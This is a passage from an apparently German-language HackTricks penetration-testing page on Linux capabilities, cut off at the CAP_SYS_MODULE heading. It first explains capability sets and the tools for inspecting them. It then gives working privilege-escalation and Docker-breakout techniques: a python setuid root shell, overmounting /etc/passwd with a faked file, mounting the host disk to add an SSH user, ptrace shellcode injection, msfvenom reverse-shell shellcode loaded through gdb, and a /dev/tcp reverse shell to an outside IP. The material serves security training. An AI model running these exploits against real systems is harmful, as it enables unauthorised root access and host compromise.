# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux Capabilities teilen **root privileges in kleinere, voneinander getrennte Einheiten** auf, sodass Prozesse eine Teilmenge der Privilegien erhalten können. Dadurch werden Risiken minimiert, da nicht unnötigerweise vollständige root privileges vergeben werden.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Das Problem:

- Normale Benutzer haben für Vorgänge wie das Öffnen von raw sockets oder das Binden von Internet-Ports unter 1024 eingeschränkte Berechtigungen; Capabilities können ausschließlich den erforderlichen Vorgang statt vollständiger root privileges gewähren.<sup>[[14]](#references)</sup>

### Capability Sets:

Linux stellt diese Capability Sets pro Thread bereit, und der Kernel wendet ihre Einschränkungen an, wenn ein Prozess seine Credentials ändert oder eine Datei ausführt.<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

- **Zweck**: Identifiziert Capabilities, die nach `execve()` zum Permitted Set beitragen können, wenn die ausgeführte Datei über übereinstimmende inheritable file capabilities verfügt.
- **Funktionsweise**: Das Inheritable Set des Threads bleibt über `execve()` hinweg erhalten; dadurch werden diese Capabilities nicht automatisch effektiv.
- **Einschränkungen**: Das Hinzufügen einer Capability zu diesem Set ist durch das Permitted Set und das Bounding Set eingeschränkt.<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

- **Zweck**: Repräsentiert die tatsächlichen Capabilities, die ein Prozess zu einem bestimmten Zeitpunkt verwendet.
- **Funktionsweise**: Dies ist das Set von Capabilities, das der Kernel prüft, um Berechtigungen für verschiedene Vorgänge zu gewähren. Bei Dateien kann dieses Set ein Flag sein, das angibt, ob die Permitted Capabilities der Datei als effektiv betrachtet werden sollen.
- **Bedeutung**: Das Effective Set ist für unmittelbare Berechtigungsprüfungen entscheidend und fungiert als aktives Set von Capabilities, die ein Prozess verwenden kann.

3. **Permitted (CapPrm)**:

- **Zweck**: Definiert das maximale Set von Capabilities, über das ein Prozess verfügen kann.
- **Funktionsweise**: Ein Prozess kann eine Capability aus dem Permitted Set in sein Effective Set übernehmen und dadurch die Möglichkeit erhalten, diese Capability zu verwenden. Er kann Capabilities auch aus seinem Permitted Set entfernen.
- **Grenze**: Wenn eine Capability aus diesem Set entfernt wurde, kann sie normalerweise nicht wiederhergestellt werden, ohne eine Datei auszuführen, die sie gewährt, oder ohne einen anderen privilegierten Übergang.<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

- **Zweck**: Beschränkt die Capabilities, die ein Prozess während `execve()` aus einer Datei erhalten und zu seinem Inheritable Set hinzufügen kann.
- **Funktionsweise**: Das Set wird über `fork()` vererbt und über `execve()` hinweg erhalten; Capabilities können daraus entfernt werden, wenn der Aufrufer `CAP_SETPCAP` besitzt.
- **Anwendungsfall**: Das Entfernen unnötiger Capabilities aus diesem Set beschränkt den späteren Erwerb von Privilegien.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
- **Zweck**: Ermöglicht es ausgewählten Capabilities, über `execve()` eines nicht privilegierten Programms hinweg im Permitted und Effective Set zu verbleiben.
- **Funktionsweise**: Ambient Capabilities werden zu den neuen Permitted und Effective Sets hinzugefügt, wenn die ausgeführte Datei nicht privilegiert ist.
- **Einschränkungen**: Eine Capability kann nur dann ambient sein, wenn sie sowohl im Permitted als auch im Inheritable Set vorhanden ist; das Ausführen einer set-user-ID/set-group-ID-Datei oder einer Datei mit Capabilities leert das Ambient Set.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities von Prozessen und Binaries

### Capabilities von Prozessen

Um die Capabilities eines bestimmten Prozesses anzuzeigen, verwende die **status**-Datei im /proc-Verzeichnis. Da sie weitere Details bereitstellt, beschränken wir uns auf die Informationen zu Linux Capabilities.\
Beachte, dass die Capability-Informationen für alle laufenden Prozesse pro Thread verwaltet werden, während File Capabilities in erweiterten `security.capability`-Attributen gespeichert werden.<sup>[[14]](#references)[[15]](#references)</sup>

Die in /usr/include/linux/capability.h definierten Capabilities sind dort zu finden.

Die Capabilities des aktuellen Prozesses kannst du mit `cat /proc/self/status` oder `capsh --print` anzeigen; die Capabilities anderer Prozesse findest du in `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
Dieser Befehl sollte auf den meisten Systemen fünf Capability-Zeilen zurückgeben.<sup>[[15]](#references)</sup>

- CapInh = Geerbte Capabilities
- CapPrm = Erlaubte Capabilities
- CapEff = Effektive Capabilities
- CapBnd = Begrenzungssatz
- CapAmb = Satz der Ambient Capabilities
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
Diese Hexadezimalzahlen ergeben keinen Sinn. Mit dem Dienstprogramm `capsh` können wir sie in Capability-Namen dekodieren.<sup>[[26]](#references)</sup>
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
Sehen wir uns nun die von `ping` verwendeten **capabilities** an:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Obwohl das funktioniert, gibt es noch eine andere und einfachere Möglichkeit. Um die Capabilities eines laufenden Prozesses anzuzeigen, verwenden Sie das Tool **getpcaps**, gefolgt von seiner Prozess-ID (PID); es akzeptiert auch eine Liste von Prozess-IDs.<sup>[[22]](#references)</sup>
```bash
getpcaps 1234
```
Überprüfen wir die capabilities von `tcpdump`, nachdem wir der Binärdatei `cap_net_admin` und `cap_net_raw` zum Mitschneiden des Netzwerkverkehrs gegeben haben (`tcpdump` läuft im Prozess 9562).<sup>[[22]](#references)[[25]](#references)</sup>
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
Wie du sehen kannst, entsprechen die Capabilities den Ergebnissen der beiden Methoden zur Untersuchung eines Prozesses. Das Tool `getpcaps` verwendet libcap, um die Capabilities eines Zielprozesses abzufragen, und gibt sie in Textform aus; es akzeptiert eine oder mehrere PIDs.<sup>[[22]](#references)</sup>

### Binary-Capabilities

Binaries können über File-Capabilities verfügen, die während der Ausführung angewendet werden. Ein `ping`-Binary kann beispielsweise die Capability `cap_net_raw` besitzen.<sup>[[14]](#references)</sup>
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
Du kannst **Binärdateien mit Capabilities** mithilfe von `getcap -r` durchsuchen.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Capabilities mit capsh entfernen

Wenn wir `CAP_NET_RAW` aus dem geltenden Bounding Set entfernen, sollte ein Programm, das diese Capability benötigt, sie nicht mehr verwenden können.<sup>[[26]](#references)</sup>
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
Neben der Ausgabe von _capsh_ selbst sollte auch der Befehl _tcpdump_ einen Fehler auslösen.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Der Fehler zeigt, dass `tcpdump` nicht mit der angeforderten Datei-Capability ausgeführt werden kann, nachdem `CAP_NET_RAW` aus dem Bounding Set entfernt wurde.

### Capabilities entfernen

Du kannst die Capabilities einer Datei mit `setcap -r` entfernen.<sup>[[25]](#references)</sup>
```bash
setcap -r </path/to/binary>
```
## User-Capabilities

Linux weist einem Login-Benutzer keine Datei-Capabilities direkt zu, aber das PAM-Modul `pam_cap` kann mithilfe von `/etc/security/capability.conf` vererbbare Capabilities für authentifizierte Sessions festlegen.<sup>[[16]](#references)</sup> Jeder Eintrag ordnet durch Kommas getrennte Capability-Namen oder -Nummern einem oder mehreren Benutzernamen zu.<sup>[[17]](#references)</sup>
Dateibeispiel:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Umgebungs-Capabilities

Das Kompilieren des folgenden Programms ermöglicht es, **eine Bash-Shell innerhalb einer Umgebung zu starten, die Capabilities bereitstellt**.<sup>[[14]](#references)</sup>
```c:ambient.c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Innerhalb der von der kompilierten ambient-Binary ausgeführten **bash** ist es möglich, die **neuen Capabilities** zu beobachten (ein regulärer Benutzer verfügt im Abschnitt „current“ über keine Capability).<sup>[[14]](#references)</sup>
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
> [!CAUTION]
> Du kannst **nur Capabilities hinzufügen, die sowohl in den erlaubten als auch in den vererbbaren Sets vorhanden sind**.<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb-Binaries

Ein Capability-dumb-Binary ist ein Programm mit File-Capabilities, das libcap nicht zu deren Verwaltung verwendet. Wenn sein File-effective-Bit gesetzt ist, aktiviert der Kernel die erlaubten File-Capabilities im Effective-Set des Prozesses; die Ausführung kann fehlschlagen, wenn der Prozess nicht alle erlaubten Capabilities erhalten hat.<sup>[[14]](#references)</sup>

## Service Capabilities

Ein Systemdienst, der als Root ausgeführt wird, kann weitreichende Capabilities behalten, sofern seine Ausführungsumgebung diese nicht einschränkt. In einer systemd-Unit wählt `User=` den Benutzer des Dienstes aus, und `AmbientCapabilities=` fügt dem Ambient-Set des ausgeführten Prozesses benannte Capabilities hinzu.<sup>[[18]](#references)</sup>
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities in Docker-Containern

Docker startet Container mit einem standardmäßigen Capability-Set, das mit `--cap-add` und `--cap-drop` geändert werden kann; ein Beispiel-Container kann mit `amicontained` untersucht werden.<sup>[[19]](#references)[[24]](#references)</sup>
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
## Privesc/Container Escape

Capabilities sind nützlich, wenn du **deine eigenen Prozesse nach der Ausführung privilegierter Operationen einschränken möchtest** (z. B. nach dem Einrichten von chroot und dem Binden an einen Socket). Sie können jedoch ausgenutzt werden, indem man ihnen bösartige Befehle oder Argumente übergibt, die anschließend als root ausgeführt werden.<sup>[[2]](#references)</sup>

Mit `setcap` kannst du File-Capabilities für Programme erzwingen und sie mit `getcap` abfragen.<sup>[[23]](#references)[[25]](#references)</sup>
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
Für File-Capability-Text erhöht `+ep` die angegebene Capability in den effektiven und erlaubten Sets; `-` senkt die ausgewählten Flags.<sup>[[21]](#references)</sup>

Um Programme in einem System oder Ordner mit Capabilities zu identifizieren, verwende `getcap -r`.<sup>[[23]](#references)</sup>
```bash
getcap -r / 2>/dev/null
```
### Exploitation-Beispiel

Im folgenden Beispiel wird festgestellt, dass das Binary `/usr/bin/python2.6` für eine Privilege Escalation anfällig ist:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities**, die `tcpdump` benötigt, um **jedem Benutzer das Sniffen von Paketen zu ermöglichen**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### Der Sonderfall von „leeren“ capabilities

Eine Datei kann eine leere capability-Menge enthalten (`getcap myelf` gibt `myelf =ep` zurück). Eine leere Menge gewährt keine capabilities; in Kombination mit einem root-owned set-user-ID-Bit kann das Programm die effektiven und gespeicherten IDs des ausführenden Prozesses dennoch auf 0 ändern, ohne file capabilities zu erlangen. Eine nicht root-owned Datei ohne SUID/SGID-Bit mit `=ep` wird nicht als root ausgeführt.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** ist eine äußerst mächtige Linux-capability, die aufgrund ihrer umfangreichen **administrativen Berechtigungen** oft mit nahezu vollständigen root-Rechten gleichgesetzt wird, beispielsweise zum Mounten von Geräten oder zur Manipulation von Kernel-Features. Obwohl sie für Container, die vollständige Systeme simulieren, unverzichtbar ist, stellt **`CAP_SYS_ADMIN` erhebliche Sicherheitsherausforderungen** dar, insbesondere in containerisierten Umgebungen, da sie zu einer Privilege Escalation und einer Kompromittierung des Systems führen kann. Daher erfordert ihre Verwendung strenge Sicherheitsbewertungen und eine vorsichtige Verwaltung. Es wird dringend empfohlen, diese capability in anwendungsspezifischen Containern zu entfernen, um das **Prinzip der geringsten Rechte** einzuhalten und die Angriffsfläche zu minimieren.<sup>[[14]](#references)</sup>

**Beispiel mit Binary**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Mithilfe von Python kannst du eine modifizierte _passwd_-Datei über die echte _passwd_-Datei mounten:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
Und schließlich **mount** die geänderte `passwd`-Datei auf `/etc/passwd`:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
Und du wirst in der Lage sein, dich mit **`su` als root** und dem Passwort „password“ anzumelden.

**Beispiel mit Umgebung (Docker breakout)**

Du kannst die aktivierten Capabilities innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
In der vorherigen Ausgabe ist zu sehen, dass die SYS_ADMIN capability aktiviert ist.<sup>[[14]](#references)</sup>

- **Mount**

Mit geeignetem Geräte- und Namespace-Zugriff kann dies einem Docker-Container ermöglichen, eine Host-Festplatte zu **mounten und auf deren Inhalte zuzugreifen**.<sup>[[14]](#references)</sup>
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
- **Vollständiger Zugriff**

Mit der vorherigen Methode konnten wir auf eine Host-Festplatte zugreifen.\
Wenn der Host einen **ssh**-Server ausführt, könntest du einen **Benutzer innerhalb der eingebundenen Festplatte erstellen** und über SSH darauf zugreifen.<sup>[[14]](#references)</sup>
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP_SYS_PTRACE

Mit `CAP_SYS_PTRACE` kann ein Prozess andere Prozesse verfolgen und untersuchen, die in seinem PID-Namespace sichtbar sind. Um aus einem Docker-Container auf Host-Prozesse zuzugreifen, muss der Host-PID-Namespace mit `--pid=host` geteilt werden (oder einem Namespace beigetreten werden, der das Ziel enthält).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** gewährt die Möglichkeit, die von `ptrace(2)` bereitgestellten Funktionen zum Debugging und zur Systemaufrufverfolgung sowie Cross-Memory-Attach-Aufrufe wie `process_vm_readv(2)` und `process_vm_writev(2)` zu verwenden. Obwohl diese Funktionen für Diagnose- und Überwachungszwecke leistungsfähig sind, können sie die Systemsicherheit erheblich beeinträchtigen, wenn `CAP_SYS_PTRACE` ohne einschränkende Maßnahmen wie einen seccomp-Filter für `ptrace(2)` aktiviert ist. Insbesondere kann es dazu ausgenutzt werden, andere Sicherheitsbeschränkungen zu umgehen, insbesondere solche, die durch seccomp auferlegt werden, wie anhand von [Proofs of Concept (PoC) wie diesem](https://gist.github.com/thejh/8346f47e359adecd1d53) demonstriert wird.<sup>[[10]](#references)</sup>

**Beispiel mit Binary (Python)**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**Beispiel mit Binary (gdb)**

`gdb` mit `ptrace`-Capability:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
Shellcode mit msfvenom erstellen, um ihn über gdb in den Speicher zu injizieren
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
Debugge einen Root-Prozess mit gdb und füge die zuvor generierten gdb-Zeilen per Copy-and-paste ein:
```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**Beispiel mit Umgebung (Docker breakout) - Another gdb Abuse**

Wenn **GDB** installiert ist (oder du es beispielsweise mit `apk add gdb` oder `apt install gdb` installieren kannst), kannst du **einen Prozess vom Host aus debuggen** und ihn die `system`-Funktion aufrufen lassen. (Diese Technik erfordert ebenfalls die Capability `SYS_ADMIN`)**.**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
Du wirst die Ausgabe des ausgeführten Befehls nicht sehen können, aber er wird von diesem Prozess ausgeführt (also eine rev shell erhalten).

> [!WARNING]
> Wenn du den Fehler "No symbol "system" in current context." erhältst, sieh dir das vorherige Beispiel zum Laden eines Shellcodes in ein Programm über gdb an.

**Beispiel mit Umgebung (Docker breakout) - Shellcode Injection**

Du kannst die aktivierten Capabilities innerhalb des Docker-Containers mit folgendem Befehl überprüfen:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
Liste die auf dem **host** laufenden **processes** auf: `ps -eaf`

1. Ermittle die **architecture**: `uname -m`
2. Finde einen **shellcode** für die Architektur ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Finde ein **program**, um den **shellcode** in den Speicher eines Prozesses zu **inject**en ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Modify** den **shellcode** innerhalb des Programms und **compile** ihn: `gcc inject.c -o inject`
5. **Inject** ihn und erhalte deine **shell**: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

